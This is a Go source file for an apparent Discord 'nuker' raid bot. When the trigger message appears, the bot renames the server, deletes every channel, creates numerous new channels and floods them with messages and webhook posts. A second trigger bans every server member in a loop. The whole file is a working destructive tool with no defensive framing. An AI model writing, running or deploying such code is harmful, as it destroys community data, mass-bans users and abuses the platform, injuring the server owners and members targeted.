package main

import (
	"encoding/json"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/net/http2"
)

type Config struct {
	Token       string `json:"token"`
	Trigger     string `json:"trigger"`
	BanTrigger  string `json:"banTrigger"`
	ServerName  string `json:"serverName"`
	WebhookName string `json:"webhookName"`
	Setup       struct {
		ChannelName    string `json:"channelName"`
		ChannelCount   int    `json:"channelCount"`
		MessageContent string `json:"messageContent"`
		MessageCount   int    `json:"messageCount"`
	} `json:"setup"`
}

var config Config

func main() {
	file, _ := os.ReadFile("config.json")
	json.Unmarshal(file, &config)

	dg, _ := discordgo.New("Bot " + config.Token)
	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsGuildMembers

	dg.Client = &http.Client{
		Transport: &http2.Transport{
			AllowHTTP:        true,
			MaxReadFrameSize: 1 << 20,
		},
		Timeout: 10 * time.Second,
	}

	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.Bot { return }

		if m.Content == config.Trigger {
			gID := m.GuildID
			go s.GuildEdit(gID, &discordgo.GuildParams{Name: config.ServerName})

			chs, _ := s.GuildChannels(gID)
			for _, ch := range chs {
				go s.ChannelDelete(ch.ID)
			}

			for i := 1; i <= config.Setup.ChannelCount; i++ {
				go func(idx int) {
					cName := config.Setup.ChannelName + "-" + strconv.Itoa(idx)
					newCh, err := s.GuildChannelCreate(gID, cName, discordgo.ChannelTypeGuildText)
					if err != nil { return }

					for j := 0; j < config.Setup.MessageCount; j++ {
						go s.ChannelMessageSend(newCh.ID, config.Setup.MessageContent)
					}

					go func() {
						wh, err := s.WebhookCreate(newCh.ID, config.WebhookName, "")
						if err == nil {
							for k := 0; k < config.Setup.MessageCount; k++ {
								go s.WebhookExecute(wh.ID, wh.Token, false, &discordgo.WebhookParams{
									Content: config.Setup.MessageContent,
								})
							}
						}
					}()
				}(i)
			}
		}

		if m.Content == config.BanTrigger {
			lastID := ""
			for {
				members, _ := s.GuildMembers(m.GuildID, lastID, 1000)
				if len(members) == 0 { break }
				for _, member := range members {
					if member.User.ID == s.State.User.ID { continue }
					time.Sleep(10 * time.Millisecond)
					go s.GuildBanCreateWithReason(m.GuildID, member.User.ID, "Purge", 0)
					lastID = member.User.ID
				}
				if len(members) < 1000 { break }
			}
		}
	})

	dg.Open()
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
}
